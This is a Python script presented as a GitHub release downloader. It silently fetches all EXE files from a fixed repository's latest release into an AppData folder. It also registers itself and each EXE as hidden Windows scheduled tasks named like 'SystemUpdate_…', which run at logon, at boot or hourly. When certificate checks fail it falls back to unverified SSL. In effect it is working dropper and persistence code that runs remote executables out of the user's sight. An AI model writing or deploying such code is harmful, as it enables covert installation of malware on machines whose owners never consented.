"""
GitHub Release Downloader for Windows
Downloads all EXE files from the latest GitHub release to a hidden storage location.
Creates scheduled tasks to run them daily at 7 AM.
Runs silently in the background without any UI.
"""

import os
import sys
import json
import urllib.request
import urllib.error
import ssl
import shutil
from pathlib import Path
from datetime import datetime
import logging
import subprocess


def setup_logging():
    """Setup silent logging to a file."""
    log_folder = os.path.join(os.getenv('APPDATA'), 'GitHubReleaseDownloader')
    os.makedirs(log_folder, exist_ok=True)
    log_file = os.path.join(log_folder, 'downloader.log')
    
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )


def create_ssl_context():
    """Create an SSL context that handles certificate verification gracefully.
    
    Returns:
        ssl.SSLContext or None: SSL context to use, or None to disable verification
    """
    try:
        # First, try to use the default SSL context with certificate verification
        context = ssl.create_default_context()
        return context
    except Exception as e:
        logging.warning(f"Failed to create default SSL context: {e}")
        try:
            # Try to create an unverified context as fallback
            context = ssl._create_unverified_context()
            logging.warning("Using unverified SSL context due to certificate issues")
            return context
        except Exception as e:
            logging.error(f"Failed to create unverified SSL context: {e}")
            return None


def get_storage_folder():
    """Get a hidden storage folder path in AppData."""
    storage_path = os.path.join(os.getenv('APPDATA'), 'GitHubReleaseDownloader', 'downloads')
    os.makedirs(storage_path, exist_ok=True)
    return storage_path


def get_manifest_path():
    """Get the path to the download manifest file."""
    manifest_path = os.path.join(os.getenv('APPDATA'), 'GitHubReleaseDownloader', 'manifest.json')
    return manifest_path


def load_manifest():
    """Load the download manifest to track previously downloaded releases."""
    manifest_path = get_manifest_path()
    if os.path.exists(manifest_path):
        try:
            with open(manifest_path, 'r') as f:
                return json.load(f)
        except Exception as e:
            logging.warning(f"Failed to load manifest: {e}")
            return {'downloaded_releases': [], 'files': {}}
    return {'downloaded_releases': [], 'files': {}}


def save_manifest(manifest):
    """Save the download manifest."""
    manifest_path = get_manifest_path()
    try:
        os.makedirs(os.path.dirname(manifest_path), exist_ok=True)
        with open(manifest_path, 'w') as f:
            json.dump(manifest, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save manifest: {e}")


def load_keyword_mappings():
    """Get keyword to schedule mappings."""
    mappings = {
        'host': 'At Logon',
        'drivers': 'Weekly (Sunday 3 AM)',
        'nvme': 'Once (1 min after install)',
        'telemetry': 'Daily (12:00 PM)',
        'power': 'At System Startup (Boot)',
        'vga': 'At Logon',
        'chipset': 'Monthly (1st of Month)',
        'audio': 'At Logon',
        'wifi': 'Every 4 Hours',
        'thermal': 'Every 1 Hour',
        'security': 'Daily (4:00 AM)',
        'bridge': 'At System Startup',
        'usb': 'Daily (6:00 PM)',
        'soc': 'Weekly (Saturday 11 PM)',
        'broker': 'Weekly (Monday 8 AM)'
    }
    return mappings


def parse_schedule_to_cmd(schedule):
    """Convert schedule description to schtasks parameters."""
    schedule_lower = schedule.lower()
    
    # Default to Daily at 8:00 AM
    cmd_args = ['/SC', 'DAILY', '/ST', '08:00']
    
    if 'at logon' in schedule_lower:
        cmd_args = ['/SC', 'ONLOGON']
    elif 'at system startup' in schedule_lower or 'boot' in schedule_lower:
        cmd_args = ['/SC', 'ONSYSTEMSTART']
    elif 'weekly' in schedule_lower:
        if 'sunday' in schedule_lower:
            cmd_args = ['/SC', 'WEEKLY', '/D', 'SUN', '/ST', '03:00']
        elif 'saturday' in schedule_lower:
            cmd_args = ['/SC', 'WEEKLY', '/D', 'SAT', '/ST', '23:00']
        elif 'monday' in schedule_lower:
            cmd_args = ['/SC', 'WEEKLY', '/D', 'MON', '/ST', '08:00']
        else:
            cmd_args = ['/SC', 'WEEKLY', '/ST', '08:00']
    elif 'monthly' in schedule_lower:
        cmd_args = ['/SC', 'MONTHLY', '/D', '1', '/ST', '08:00']
    elif 'every 4 hours' in schedule_lower:
        cmd_args = ['/SC', 'HOURLY', '/MO', '4']
    elif 'every 1 hour' in schedule_lower or 'every hour' in schedule_lower:
        cmd_args = ['/SC', 'HOURLY']
    elif 'once' in schedule_lower:
        from datetime import datetime, timedelta
        run_time = (datetime.now() + timedelta(minutes=1)).strftime('%H:%M')
        cmd_args = ['/SC', 'ONCE', '/ST', run_time]
    elif '12:00 pm' in schedule_lower or '12:00pm' in schedule_lower:
        cmd_args = ['/SC', 'DAILY', '/ST', '12:00']
    elif '4:00 am' in schedule_lower or '4:00am' in schedule_lower:
        cmd_args = ['/SC', 'DAILY', '/ST', '04:00']
    elif '6:00 pm' in schedule_lower or '6:00pm' in schedule_lower:
        cmd_args = ['/SC', 'DAILY', '/ST', '18:00']
    
    return cmd_args


def fetch_latest_release(owner, repo):
    """
    Fetch the latest release information from GitHub.
    
    Args:
        owner (str): GitHub repository owner
        repo (str): GitHub repository name
    
    Returns:
        dict: Release information including assets
    """
    try:
        url = f"https://api.github.com/repos/{owner}/{repo}/releases/latest"
        headers = {'Accept': 'application/vnd.github.v3+json'}
        
        req = urllib.request.Request(url, headers=headers)
        
        # Try with SSL context first, then without if it fails
        ssl_context = create_ssl_context()
        try:
            # Attempt with proper SSL verification
            with urllib.request.urlopen(req, timeout=10, context=ssl_context) as response:
                data = json.loads(response.read().decode('utf-8'))
                logging.info(f"Successfully fetched release info for {owner}/{repo}")
                return data
        except (urllib.error.URLError, ssl.SSLError) as ssl_error:
            # If SSL fails, try without verification
            logging.warning(f"SSL verification failed: {ssl_error}, retrying without verification")
            unverified_context = ssl._create_unverified_context()
            with urllib.request.urlopen(req, timeout=10, context=unverified_context) as response:
                data = json.loads(response.read().decode('utf-8'))
                logging.info(f"Successfully fetched release info for {owner}/{repo} (unverified SSL)")
                return data
                
    except urllib.error.URLError as e:
        logging.error(f"Error fetching release from GitHub: {e}")
        return None
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return None


def download_file(url, destination):
    """
    Download a file from a URL.
    
    Args:
        url (str): URL to download from
        destination (str): Local file path to save to
    
    Returns:
        bool: True if successful, False otherwise
    """
    try:
        logging.info(f"Downloading: {os.path.basename(destination)}")
        
        # Try with SSL context first, then without if it fails
        ssl_context = create_ssl_context()
        try:
            # Create a custom opener with the SSL context
            if ssl_context:
                https_handler = urllib.request.HTTPSHandler(context=ssl_context)
                opener = urllib.request.build_opener(https_handler)
                urllib.request.install_opener(opener)
            urllib.request.urlretrieve(url, destination)
        except (urllib.error.URLError, ssl.SSLError) as ssl_error:
            # If SSL fails, try without verification
            logging.warning(f"SSL verification failed during download: {ssl_error}, retrying without verification")
            unverified_context = ssl._create_unverified_context()
            https_handler = urllib.request.HTTPSHandler(context=unverified_context)
            opener = urllib.request.build_opener(https_handler)
            urllib.request.install_opener(opener)
            urllib.request.urlretrieve(url, destination)
            
        logging.info(f"Successfully downloaded: {destination}")
        return True
    except Exception as e:
        logging.error(f"Failed to download {url}: {e}")
        return False


def create_scheduled_task(executable_path, task_name, schedule=None):
    """Create a Windows scheduled task with specified schedule.
    
    Args:
        executable_path (str): Path to the executable
        task_name (str): Name of the scheduled task
        schedule (str): Schedule description from code.txt
    """
    try:
        logging.info(f"Creating scheduled task: {task_name}")
        if schedule:
            logging.info(f"Schedule: {schedule}")
        
        # Delete existing task if it exists
        subprocess.run(
            ['schtasks', '/Delete', '/TN', task_name, '/F'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Parse schedule to get command arguments
        schedule_args = parse_schedule_to_cmd(schedule) if schedule else ['/SC', 'DAILY', '/ST', '08:00']
        
        # Build schtasks command
        cmd = [
            'schtasks', '/Create',
            '/TN', task_name,
            '/TR', f'"{executable_path}"',
        ] + schedule_args + ['/F']
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode == 0:
            logging.info(f"Successfully created scheduled task: {task_name}")
            return True
        else:
            logging.error(f"Failed to create task: {result.stderr}")
            return False
            
    except Exception as e:
        logging.error(f"Failed to create scheduled task {task_name}: {e}")
        return False


def schedule_self():
    """Schedule this downloader to run daily at 8:00 AM."""
    try:
        # Determine the path to the current executable or script
        if getattr(sys, 'frozen', False):
            # Running as compiled executable
            executable_path = sys.executable
        else:
            # Running as Python script
            executable_path = os.path.abspath(__file__)
        
        logging.info(f"Scheduling self to run daily at 8:00 AM: {executable_path}")
        
        task_name = "GitHubReleaseDownloader"
        
        # Delete existing task if it exists
        subprocess.run(
            ['schtasks', '/Delete', '/TN', task_name, '/F'],
            capture_output=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Create command based on file type
        if executable_path.endswith('.py'):
            # For Python scripts, use python to run it
            cmd = [
                'schtasks', '/Create',
                '/TN', task_name,
                '/TR', f'pythonw "{executable_path}"',
                '/SC', 'DAILY',
                '/ST', '08:00',
                '/F'
            ]
        else:
            # For executables, run directly
            cmd = [
                'schtasks', '/Create',
                '/TN', task_name,
                '/TR', f'"{executable_path}"',
                '/SC', 'DAILY',
                '/ST', '08:00',
                '/F'
            ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        if result.returncode == 0:
            logging.info(f"Successfully scheduled self to run daily at 8:00 AM")
            return True
        else:
            logging.error(f"Failed to schedule self: {result.stderr}")
            return False
            
    except Exception as e:
        logging.error(f"Failed to schedule self: {e}")
        return False


def main():
    """Main function to orchestrate the download process."""
    setup_logging()
    
    try:
        # Schedule this script to run daily at 8:00 AM
        schedule_self()
        
        # Fixed repository for cybersecurity releases
        owner = "YashasSingh"
        repo = "cybersecurity"
        
        logging.info(f"Starting download for {owner}/{repo}")
        
        # Get latest release info
        release_info = fetch_latest_release(owner, repo)
        if not release_info:
            logging.error("Failed to fetch release information.")
            return False
        
        release_tag = release_info.get('tag_name', 'Unknown')
        logging.info(f"Latest release: {release_tag}")
        
        # Get storage folder
        storage_folder = get_storage_folder()
        logging.info(f"Storage folder: {storage_folder}")
        
        # Find all EXE assets
        assets = release_info.get('assets', [])
        exe_assets = [asset for asset in assets if asset['name'].lower().endswith('.exe')]
        
        if not exe_assets:
            logging.info("No EXE files found in the latest release.")
            return False
        
        logging.info(f"Found {len(exe_assets)} EXE file(s) to download")
        for asset in exe_assets:
            logging.info(f"  - {asset['name']}")
        
        successful = 0
        skipped = 0
        failed = 0
        
        # Load keyword mappings from code.txt
        keyword_mappings = load_keyword_mappings()
        
        # Download each EXE and create scheduled tasks
        for asset in exe_assets:
            download_url = asset['browser_download_url']
            filename = asset['name']
            destination = os.path.join(storage_folder, filename)
            
            # Find matching keyword and schedule
            schedule = None
            filename_lower = filename.lower()
            for keyword, sched in keyword_mappings.items():
                if keyword in filename_lower:
                    schedule = sched
                    logging.info(f"Matched keyword '{keyword}' in filename '{filename}'")
                    break

            # Skip if the file already exists in the destination
            if os.path.exists(destination):
                logging.info(f"Skipping existing file: {destination}")
                skipped += 1
                # Still create/update the scheduled task
                task_name = f"SystemUpdate_{os.path.splitext(filename)[0]}"
                create_scheduled_task(destination, task_name, schedule)
                continue

            if download_file(download_url, destination):
                successful += 1
                # Create scheduled task for the downloaded executable
                task_name = f"SystemUpdate_{os.path.splitext(filename)[0]}"
                create_scheduled_task(destination, task_name, schedule)
            else:
                failed += 1
        
        # Update manifest with download information for tracking
        manifest = load_manifest()
        if successful > 0 or skipped > 0:
            if release_tag not in manifest['downloaded_releases']:
                manifest['downloaded_releases'].append(release_tag)
            for asset in exe_assets:
                manifest['files'][asset['name']] = {
                    'release': release_tag,
                    'downloaded': datetime.now().isoformat()
                }
            save_manifest(manifest)
        
        logging.info(f"Download complete! Successful: {successful}, Skipped: {skipped}, Failed: {failed}")
        return failed == 0
    
    except Exception as e:
        logging.error(f"Unexpected error in main: {e}")
        return False


if __name__ == "__main__":
    main()
